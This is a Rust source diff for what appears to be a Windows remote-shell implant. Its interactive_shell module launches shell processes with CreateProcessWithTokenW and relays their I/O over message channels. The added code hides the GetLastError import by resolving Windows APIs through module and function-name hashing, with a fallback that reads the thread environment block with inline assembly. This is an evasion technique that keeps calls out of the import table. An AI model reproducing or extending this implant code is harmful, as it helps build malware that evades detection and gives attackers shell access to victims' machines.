@@ -39,6 +39,29 @@ use std::ffi::c_void;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Mutex, OnceLock};
 
+/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
+#[cfg(windows)]
+unsafe fn get_last_error() -> u32 {
+    use std::sync::OnceLock;
+    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
+    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"GetLastError\0"),
+        )?;
+        Some(std::mem::transmute(addr))
+    });
+    if let Some(func) = fn_ptr {
+        func()
+    } else {
+        // Fallback: read TEB directly (x86_64 Windows)
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        std::ptr::read_volatile(teb.add(0x68) as *const u32)
+    }
+}
+
 use common::Message;
 use tokio::sync::mpsc::Sender;
 
@@ -500,7 +523,7 @@ fn spawn_shell_process(
         if result == 0 {
             log::warn!(
                 "[interactive_shell] CreateProcessWithTokenW failed (err {}), falling back to CreateProcessW",
-                winapi::um::errhandlingapi::GetLastError()
+                unsafe { get_last_error() }
             );
             // Fall back to CreateProcessW.
             let result = unsafe {
@@ -518,7 +541,7 @@ fn spawn_shell_process(
                 )
             };
             if result == 0 {
-                let err = winapi::um::errhandlingapi::GetLastError();
+                let err = unsafe { get_last_error() };
                 close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
                 return Err(format!("CreateProcessW failed: error {err}"));
             }
@@ -543,7 +566,7 @@ fn spawn_shell_process(
             )
         };
         if result == 0 {
-            let err = winapi::um::errhandlingapi::GetLastError();
+            let err = unsafe { get_last_error() };
             close_all_handles(stdin_read, stdin_write, stdout_read, stdout_write, stderr_read, stderr_write);
             return Err(format!("CreateProcessW failed: error {err}"));
         }
@@ -647,7 +670,7 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
         )
     };
     if result == 0 {
-        let err = winapi::um::errhandlingapi::GetLastError();
+        let err = unsafe { get_last_error() };
         Err(format!("WriteFile to stdin pipe failed: error {err}"))
     } else {
         Ok(())
